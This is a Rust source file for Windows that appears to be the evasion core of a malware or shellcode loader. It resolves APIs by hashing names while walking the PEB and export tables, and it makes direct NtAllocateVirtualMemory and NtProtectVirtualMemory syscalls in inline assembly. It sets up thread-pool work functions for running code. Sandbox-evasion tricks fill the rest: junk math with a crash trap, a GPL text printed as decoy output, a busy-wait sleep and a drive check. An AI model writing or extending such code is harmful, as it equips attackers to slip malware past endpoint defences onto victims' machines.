use crate::execute;
use core::{
    arch::asm,
    ffi::c_void,
    hint::black_box,
    mem::transmute_copy,
    ptr::{null_mut, read_volatile},
};
use windows_sys::Win32::{
    Foundation::{FILETIME, SYSTEMTIME},
    Storage::FileSystem::GetLogicalDrives,
    System::SystemInformation::{GetLocalTime, GetSystemTimeAsFileTime, GetTickCount64},
};

const KERNEL32: u32 = hash_djb2(b"KERNEL32.DLL");
const NTDLL: u32 = hash_djb2(b"NTDLL.DLL");
const NT_VIRTUAL_ALLOC: u32 = hash_djb2(b"NtAllocateVirtualMemory");
const NT_VIRTUAL_PROTECT: u32 = hash_djb2(b"NtProtectVirtualMemory");
//const CREATE_THREAD: u32 = hash_djb2(b"CreateThread");
//const WAIT_FOR_OBJECT: u32 = hash_djb2(b"WaitForSingleObject");
const ATTACH_CONSOLE: u32 = hash_djb2(b"AttachConsole");
const ALLOC_CONSOLE: u32 = hash_djb2(b"AllocConsole");
const NT_TERMINATE_PROCESS: u32 = hash_djb2(b"NtTerminateProcess");
const WRITE_FILE: u32 = hash_djb2(b"WriteFile");
const GET_STD_HANDLE: u32 = hash_djb2(b"GetStdHandle");
const TP_ALLOC_WORK: u32 = hash_djb2(b"TpAllocWork");
const TP_POST_WORK: u32 = hash_djb2(b"TpPostWork");

pub type FnNtAllocateVirtualMemory = unsafe extern "system" fn(
    process_handle: *mut c_void,
    base_address: *mut *mut c_void,
    zero_bits: usize,
    region_size: *mut usize,
    allocation_type: u32,
    protect: u32,
) -> i32;

pub type FnNtProtectVirtualMemory = unsafe extern "system" fn(
    process_handle: *mut c_void,
    base_address: *mut *mut c_void,
    region_size: *mut usize,
    new_protect: u32,
    old_protect: *mut u32,
) -> i32;

pub type FnNtTerminateProcess =
    unsafe extern "system" fn(process_handle: *mut c_void, exit_status: i32) -> i32;

pub type PtpWorkCallback =
    unsafe extern "system" fn(instance: *mut c_void, context: *mut c_void, work: *mut c_void);

type FnTpAllocWork = unsafe extern "system" fn(
    ptp_wrk: *mut c_void,
    pfn_wkcb: Option<PtpWorkCallback>,
    pv: *mut core::ffi::c_void,
    pcbe: *mut core::ffi::c_void,
) -> i32;

type FnTpPostWork = unsafe extern "system" fn(pwk: *mut c_void) -> *mut c_void;

type FnGetStdHandle = unsafe extern "system" fn(n_std_handle: u32) -> *mut c_void;

pub type FnWriteFile = unsafe extern "system" fn(
    h_file: *mut c_void,
    lp_buffer: *const u8,
    n_number_of_bytes_to_write: u32,
    lp_number_of_bytes_written: *mut u32,
    lp_overlapped: *mut c_void,
) -> i32;

/*type FnCreateThread = unsafe extern "system" fn(
    lp_thread_attr: *mut c_void,
    dw_stack_size: usize,
    lp_start_addr: *mut c_void,
    lp_param: *mut c_void,
    dw_creation_flags: u32,
    lp_thread_id: *mut u32,
) -> *mut c_void;

type FnVirtualAlloc = unsafe extern "system" fn(
    lp_addr: *const c_void,
    dw_size: usize,
    fl_alloc_type: u32,
    fl_protect: u32,
) -> *mut c_void;

type FnVirtualProtect = unsafe extern "system" fn(
    lp_addr: *mut c_void,
    dw_size: usize,
    fl_new_protect: u32,
    lp_fl_old_protect: *mut u32
) -> i32;

type FnWaitForSingleObject = unsafe extern "system" fn(
    h_handle: *mut c_void,
    dw_milliseconds: u32,
) -> u32;*/

type FnAttachConsole = unsafe extern "system" fn(dw_process_id: u32) -> i32;

type FnAllocConsole = unsafe extern "system" fn() -> i32;

//type FnExitProcess = unsafe extern "system" fn(exit_code: u32) -> !;

pub struct WinApi {
    pub h_std_out: *mut c_void,
    pub write_file: FnWriteFile,
    pub virtual_protect: FnNtProtectVirtualMemory,
    pub virtual_alloc: FnNtAllocateVirtualMemory,
    //pub create_thread: FnCreateThread,
    //pub wait_for_object: FnWaitForSingleObject,
    pub attach_console: FnAttachConsole,
    pub alloc_console: FnAllocConsole,
    pub exit_process: FnNtTerminateProcess,
    pub tp_post_work: FnTpPostWork,
    pub tp_alloc_work: FnTpAllocWork,
}

pub struct Syscalls {
    pub alloc: u32,
    pub protect: u32,
}

impl WinApi {
    pub fn protect(
        syscall_id: u32,
        base_addr: &mut *mut c_void,
        size: &mut usize,
        new_protect: u32,
        old_protect: &mut u32,
    ) -> i32 {
        let result;
        unsafe {
            asm!(
                "sub rsp, 48",
                "mov qword ptr [rsp + 32], {old_prot_ptr}",
                "mov r10, rcx",
                "syscall",
                "add rsp, 48",
                in("eax") syscall_id,
                in("rcx") !0usize as *mut c_void,
                in("rdx") base_addr as *mut *mut c_void,
                in("r8") size as *mut usize,
                in("r9") new_protect as usize,
                old_prot_ptr = in(reg) old_protect as *mut u32,
                lateout("eax") result,
                clobber_abi("system")
            );
        };
        result
    }

    pub fn alloc(
        syscall_id: u32,
        exec_mem: &mut *mut c_void,
        size: &mut usize,
        r#type: usize,
    ) -> i32 {
        let mut result;
        unsafe {
            asm!(
                "sub rsp, 56",
                "mov qword ptr [rsp + 32], r11",
                "mov qword ptr [rsp + 40], rax",
                "mov r10, rcx",
                "mov eax, r12d",
                "syscall",
                "add rsp, 56",
                in("rcx") !0usize as *mut c_void,
                in("rdx") exec_mem,
                in("r8") 0usize,
                in("r9") size,
                in("r11") (1 << 12) | (1 << 13) as usize,
                in("rax") r#type,
                in("r12") syscall_id,
                lateout("eax") result,
                clobber_abi("system")
            );
        };
        result
    }

    pub fn get_syscalls(&self) -> Syscalls {
        Syscalls {
            alloc: unsafe {
                core::ptr::read_volatile((self.virtual_alloc as *const u8).add(4) as *const u32)
            },
            protect: unsafe {
                core::ptr::read_volatile((self.virtual_protect as *const u8).add(4) as *const u32)
            },
        }
    }

    #[inline(always)]
    pub fn new() -> Self {
        let h_kernel32 = get_module_base(KERNEL32);
        if h_kernel32.is_null() {
            panic!();
        };
        let h_ntdll = get_module_base(NTDLL);
        if h_ntdll.is_null() {
            panic!();
        };

        let get_std_handle: FnGetStdHandle =
            unsafe { transmute_copy(&get_proc_address_by_hash(h_kernel32, GET_STD_HANDLE)) };
        Self {
            h_std_out: unsafe { get_std_handle(!10u32) },
            write_file: unsafe {
                transmute_copy(&get_proc_address_by_hash(h_kernel32, WRITE_FILE))
            },
            virtual_protect: unsafe {
                transmute_copy(&get_proc_address_by_hash(h_ntdll, NT_VIRTUAL_PROTECT))
            },
            virtual_alloc: unsafe {
                transmute_copy(&get_proc_address_by_hash(h_ntdll, NT_VIRTUAL_ALLOC))
            },
            //create_thread: unsafe { transmute_copy(&get_proc_address_by_hash(h_kernel32, CREATE_THREAD)) },
            //wait_for_object: unsafe { transmute_copy(&get_proc_address_by_hash(h_kernel32, WAIT_FOR_OBJECT)) },
            attach_console: unsafe {
                transmute_copy(&get_proc_address_by_hash(h_kernel32, ATTACH_CONSOLE))
            },
            alloc_console: unsafe {
                transmute_copy(&get_proc_address_by_hash(h_kernel32, ALLOC_CONSOLE))
            },
            exit_process: unsafe {
                transmute_copy(&get_proc_address_by_hash(h_ntdll, NT_TERMINATE_PROCESS))
            },
            tp_post_work: unsafe {
                transmute_copy(&get_proc_address_by_hash(h_ntdll, TP_POST_WORK))
            },
            tp_alloc_work: unsafe {
                transmute_copy(&get_proc_address_by_hash(h_ntdll, TP_ALLOC_WORK))
            },
        }
    }
}

#[repr(C)]
struct ListEntry {
    flink: *mut ListEntry,
    blink: *mut ListEntry,
}

#[repr(C)]
struct LdrDataTableEntry {
    in_load_order_links: ListEntry,
    in_memory_order_links: ListEntry,
    in_init_order_links: ListEntry,
    dll_base: *mut c_void,
    entry_point: *mut c_void,
    size_of_image: u32,
    full_dll_name: UnicodeString,
    base_dll_name: UnicodeString,
}

#[repr(C)]
struct UnicodeString {
    length: u16,
    maximum_length: u16,
    buffer: *mut u16,
}

#[inline(always)]
pub fn get_module_base(module_hash: u32) -> *mut c_void {
    let peb: *mut c_void;
    unsafe { core::arch::asm!("mov {}, gs:[0x60]", out(reg) peb) };

    let ldr = unsafe { *(peb.add(0x18) as *mut *mut c_void) };
    let mut current_entry = unsafe { *(ldr.add(0x10) as *mut *mut ListEntry) };
    let start_entry = current_entry;

    loop {
        let table_entry = current_entry as *mut LdrDataTableEntry;
        if unsafe { (*table_entry).dll_base.is_null() } {
            break;
        }

        let name_slice = unsafe {
            core::slice::from_raw_parts(
                (*table_entry).base_dll_name.buffer,
                ((*table_entry).base_dll_name.length / 2) as usize,
            )
        };

        let mut hash: u32 = 5381258;
        for &wchar in name_slice {
            let mut c = wchar as u8;
            if c.is_ascii_lowercase() {
                c -= 32;
            }
            hash = (hash << 5).wrapping_add(hash).wrapping_add(c as u32);
        }

        if hash == module_hash {
            return unsafe { (*table_entry).dll_base };
        }

        current_entry = unsafe { (*current_entry).flink };
        if current_entry == start_entry {
            break;
        }
    }
    core::ptr::null_mut()
}

#[inline(always)]
pub fn get_proc_address_by_hash(module_base: *mut c_void, target_hash: u32) -> *const c_void {
    let dos_header = module_base as *mut u8;

    if unsafe { *(dos_header as *mut u16) != 0x5A4D } {
        return core::ptr::null();
    }

    let e_lfanew = unsafe { *(dos_header.add(0x3C) as *mut u32) as usize };
    let nt_headers = unsafe { dos_header.add(e_lfanew) };
    let export_dir_rva = unsafe { *(nt_headers.add(0x88) as *mut u32) as usize };
    if export_dir_rva == 0 {
        return core::ptr::null();
    }

    let export_dir = unsafe { dos_header.add(export_dir_rva) };
    let number_of_names = unsafe { *(export_dir.add(24) as *mut u32) as usize };
    let address_of_functions = unsafe { *(export_dir.add(28) as *mut u32) as usize };
    let address_of_names = unsafe { *(export_dir.add(32) as *mut u32) as usize };
    let address_of_name_ordinals = unsafe { *(export_dir.add(36) as *mut u32) as usize };

    let rva_table = unsafe { dos_header.add(address_of_functions) as *mut u32 };
    let name_table = unsafe { dos_header.add(address_of_names) as *mut u32 };
    let ordinal_table = unsafe { dos_header.add(address_of_name_ordinals) as *mut u16 };

    for i in 0..number_of_names {
        let name_rva = unsafe { *name_table.add(i) as usize };
        let name_ptr = unsafe { dos_header.add(name_rva) as *const u8 };

        let mut len = 0;
        while unsafe { read_volatile(name_ptr.add(len)) } != 0 {
            len += 1;
        }
        let name_slice = unsafe { core::slice::from_raw_parts(name_ptr, len) };

        if hash_djb2(name_slice) == target_hash {
            let ordinal = unsafe { *ordinal_table.add(i) as usize };
            let func_rva = unsafe { *rva_table.add(ordinal) as usize };

            return unsafe { dos_header.add(func_rva) as *const c_void };
        }
    }
    core::ptr::null()
}

#[inline(always)]
const fn hash_djb2(str: &[u8]) -> u32 {
    let mut hash: u32 = 5381258;
    let mut i = 0;
    while i < str.len() {
        if str[i] == 0 {
            break;
        };
        hash = (hash << 5).wrapping_add(hash).wrapping_add(str[i] as u32);
        i += 1;
    }
    hash
}

#[inline(always)]
pub fn print(text: &str, h_std_out: *mut c_void, write_file: FnWriteFile) {
    if h_std_out.is_null() || h_std_out == unsafe { transmute_copy(&0xFFFFFFFFFFFFFFFFu64) } {
        return;
    };
    let mut written = 0;
    unsafe {
        write_file(
            h_std_out,
            text.as_ptr(),
            text.len() as u32,
            &mut written,
            null_mut(),
        )
    };
}

#[inline(always)]
pub fn calc(num: u64) -> u64 {
    let mut val = num;
    for i in 0..500 {
        if val.is_multiple_of(2) {
            val /= 2;
        } else {
            val = val.wrapping_mul(3).wrapping_add(1) ^ (i as u64);
        }
        if (7 * val.wrapping_mul(val))
            .wrapping_add(1)
            .is_multiple_of(7)
        {
            unsafe {
                let crash: *mut u64 = core::ptr::null_mut();
                *crash = 0xDEADBEEF;
            }
        }
        val = val.rotate_left((i % 7) as u32) ^ 0x5555555555555555;
    }
    val
}

#[inline(always)]
pub fn rand_actions(h_std_out: *mut c_void, write_file: FnWriteFile) {
    print("Hello, world!\n", h_std_out, write_file);
    if calc(unsafe { GetTickCount64() }) == 0x1488133767695242 {
        print("Good result\n", h_std_out, write_file);
    };
    for _ in 0..30 {
        print(
            "The GNU General Public Licenses (GNU GPL or simply GPL) are a series of widely used free software licenses. The GPL is a copyleft license, which means that it guarantees end users the freedom to run, study, share, or modify the software, but requires them to publish all derivative works and modifications under the same or equivalent license terms.[7] The GPL was the first copyleft license available for general use. It was originally written by Richard Stallman, the founder of the Free Software Foundation (FSF), for the GNU Project. The license grants the recipients of a computer program the rights of the Free Software Definition.[8] The GPL states more obligations on redistribution than the GNU Lesser General Public License and differs significantly from widely used permissive software licenses such as BSD, MIT, and Apache. Historically, the GPL license family has been one of the most popular software licenses in the free and open-source software (FOSS) domain.[7][9][10][11][12] Prominent free software programs licensed under the GPL include the Linux operating system kernel and the GNU Compiler Collection (GCC). David A. Wheeler argues that the copyleft provided by the GPL was crucial to the success of Linux-based systems, giving the contributing programmers some assurance that their work would benefit the world and remain free, rather than being potentially exploited by software companies who would not be required to contribute to the community.[13] In 2007, the third version of the license (GPLv3) was released to address perceived shortcomings in the second version (GPLv2) that had become apparent through long-term use. To keep the license current, the GPL includes an optional any later version clause, which allows users to choose between two options –the original terms, or the terms in new versions as updated by the FSF. Software projects licensed with the optional or later clause include the GNU Project, while projects such as the Linux kernel are licensed under GPLv2 only. The or any later version clause is sometimes known as a lifeboat clause, since it allows combinations of different versions of GPL-licensed software to maintain compatibility. Usage of the GPL has steadily declined since the 2010s, particularly because of the complexities mentioned above, as well as a perception that the license restrains the modern open source domain from growth and commercialization.[\n",
            h_std_out,
            write_file,
        );
    }
    let _: () = unsafe {
        GetLocalTime(&mut SYSTEMTIME {
            wYear: 0,
            wMonth: 0,
            wDay: 0,
            wDayOfWeek: 0,
            wHour: 0,
            wMilliseconds: 0,
            wMinute: 0,
            wSecond: 0,
        })
    };
    black_box(get_timestamp());
}

#[inline(always)]
pub fn get_timestamp() -> u64 {
    let mut ft = FILETIME {
        dwLowDateTime: 0,
        dwHighDateTime: 0,
    };
    unsafe {
        GetSystemTimeAsFileTime(&mut ft);
    };
    let win_time = ((ft.dwLowDateTime as u64) << 32) | (ft.dwHighDateTime as u64);
    (win_time - 116444736000000000) / 10000
}

#[inline(always)]
fn check_drives() {
    if unsafe { GetLogicalDrives() } == 0 {
        panic!();
    };
}

#[inline(always)]
pub fn sleep(time_ms: u64, h_std_out: *mut c_void, write_file: FnWriteFile) {
    let start_time = unsafe { GetTickCount64() };
    while start_time + time_ms > unsafe { GetTickCount64() } {
        execute(check_drives, h_std_out, write_file)
    }
}
